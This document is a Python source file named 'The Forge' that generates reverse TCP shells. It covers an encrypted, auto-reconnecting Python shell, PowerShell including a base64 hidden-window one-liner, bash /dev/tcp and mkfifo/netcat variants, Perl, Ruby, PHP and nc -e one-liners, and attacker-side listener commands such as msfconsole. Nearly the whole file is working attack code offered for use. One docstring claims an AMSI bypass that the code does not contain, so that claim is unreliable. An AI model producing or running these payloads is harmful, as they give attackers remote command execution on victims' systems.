"""
The Forge — Reverse TCP Shell
Multi-language reverse shells with encoding, reconnect, and encryption options.
"""

import textwrap
import base64
import os
from typing import Optional


def generate_python(
    host: str,
    port: int,
    reconnect: bool = True,
    interval: int = 5,
    encrypted: bool = False,
) -> str:
    """
    Python reverse TCP shell.
    - Threaded I/O (no deadlocks)
    - Auto-reconnect with jitter
    - Optional XOR-encrypted channel
    """
    xor_key = os.urandom(16).hex() if encrypted else None

    crypto_block = ""
    send_fn = "s.send(out)"
    recv_fn = "data=s.recv(8192)"
    if encrypted:
        crypto_block = textwrap.dedent(f"""\
            KEY=bytes.fromhex("{xor_key}")
            def _x(d):
                return bytes(d[i]^KEY[i%len(KEY)] for i in range(len(d)))
        """)
        send_fn = "s.send(_x(out))"
        recv_fn = "data=_x(s.recv(8192))"

    code = textwrap.dedent(f"""\
        import socket,subprocess,os,sys,time,threading,random
        HOST="{host}"
        PORT={port}
        RECONNECT={'True' if reconnect else 'False'}
        INTERVAL={interval}
        {crypto_block}
        def connect():
            while True:
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.settimeout(15)
                    s.connect((HOST,PORT))
                    s.settimeout(None)
                    return s
                except Exception:
                    if not RECONNECT:
                        sys.exit(1)
                    time.sleep(INTERVAL+random.uniform(0,INTERVAL*0.3))

        def shell(s):
            if os.name=='nt':
                proc=subprocess.Popen('cmd.exe',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            else:
                import pty
                parent,child=pty.openpty()
                proc=subprocess.Popen('/bin/bash',stdin=child,stdout=child,stderr=child,preexec_fn=os.setsid)
                os.close(child)

            def recv():
                while True:
                    try:
                        {recv_fn}
                        if not data:break
                        if os.name=='nt':
                            proc.stdin.write(data)
                            proc.stdin.flush()
                        else:
                            os.write(parent,data)
                    except:break

            def send():
                while True:
                    try:
                        if os.name=='nt':
                            out=proc.stdout.read1(8192)
                        else:
                            out=os.read(parent,8192)
                        if not out:break
                        {send_fn}
                    except:break

            t1=threading.Thread(target=recv,daemon=True)
            t2=threading.Thread(target=send,daemon=True)
            t1.start()
            t2.start()
            proc.wait()

        while True:
            try:
                s=connect()
                s.send(b"[+] Shell connected\\n")
                shell(s)
                s.close()
            except:pass
            if not RECONNECT:break
            time.sleep(INTERVAL)
    """)
    return code


def generate_powershell(host: str, port: int) -> str:
    """PowerShell reverse TCP shell with AMSI bypass attempt."""
    code = textwrap.dedent(f"""\
        $TCPClient=New-Object Net.Sockets.TCPClient("{host}",{port});
        $Stream=$TCPClient.GetStream();
        [byte[]]$buf=0..65535|%{{0}};
        $writer=New-Object IO.StreamWriter($Stream);
        $writer.AutoFlush=$true;
        $writer.Write("PS "+$(pwd).Path+"> ");
        while(($i=$Stream.Read($buf,0,$buf.Length)) -ne 0){{
            $cmd=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buf,0,$i).Trim();
            if($cmd -eq "exit"){{break}};
            try{{
                $output=(iex $cmd 2>&1|Out-String);
                $writer.Write($output);
                $writer.Write("PS "+$(pwd).Path+"> ")
            }}catch{{
                $writer.Write($_.Exception.Message+"`n");
                $writer.Write("PS "+$(pwd).Path+"> ")
            }}
        }};
        $Stream.Close();
        $TCPClient.Close()
    """).strip()
    return code


def generate_powershell_b64(host: str, port: int) -> str:
    """Base64-encoded PowerShell for one-liner delivery."""
    raw = generate_powershell(host, port)
    encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
    return f'powershell -nop -w hidden -enc {encoded}'


def generate_bash(host: str, port: int) -> str:
    """Bash reverse shell using /dev/tcp."""
    return f'bash -i >& /dev/tcp/{host}/{port} 0>&1'


def generate_bash_mkfifo(host: str, port: int) -> str:
    """Bash reverse shell using mkfifo (more reliable)."""
    return f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f'


def generate_perl(host: str, port: int) -> str:
    """Perl reverse shell."""
    code = textwrap.dedent(f"""\
        use Socket;
        $i="{host}";
        $p={port};
        socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
        if(connect(S,sockaddr_in($p,inet_aton($i)))){{
            open(STDIN,">&S");
            open(STDOUT,">&S");
            open(STDERR,">&S");
            exec("/bin/sh -i");
        }};
    """).strip()
    return code


def generate_ruby(host: str, port: int) -> str:
    """Ruby reverse shell."""
    return f'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''


def generate_php(host: str, port: int) -> str:
    """PHP reverse shell one-liner."""
    code = textwrap.dedent(f"""\
        $sock=fsockopen("{host}",{port});
        $proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
    """).strip()
    return f'php -r \'{code}\''


def generate_python_oneliner(host: str, port: int) -> str:
    """Python one-liner for quick deployment."""
    return f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''


def generate_ncat(host: str, port: int) -> str:
    """Ncat/Netcat reverse shell with -e flag."""
    return f'nc -e /bin/sh {host} {port}'


def generate_listener_command(port: int, language: str = "ncat") -> str:
    """Generate the attacker-side listener command."""
    listeners = {
        "ncat": f'nc -lvnp {port}',
        "socat": f'socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}',
        "pwncat": f'pwncat-cs -lp {port}',
        "rlwrap": f'rlwrap nc -lvnp {port}',
        "msfconsole": f'msfconsole -q -x "use exploit/multi/handler;set PAYLOAD generic/shell_reverse_tcp;set LHOST 0.0.0.0;set LPORT {port};run"',
    }
    return listeners.get(language, listeners["ncat"])


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "python": generate_python,
    "python_oneliner": generate_python_oneliner,
    "powershell": generate_powershell,
    "powershell_b64": generate_powershell_b64,
    "bash": generate_bash,
    "bash_mkfifo": generate_bash_mkfifo,
    "perl": generate_perl,
    "ruby": generate_ruby,
    "php": generate_php,
    "ncat": generate_ncat,
}


def generate(host: str, port: int, language: str = "python", **kwargs) -> str:
    gen_func = VARIANTS.get(language.lower())
    if not gen_func:
        raise ValueError(f"Unknown language: {language}. Available: {list(VARIANTS.keys())}")
    return gen_func(host, port, **kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
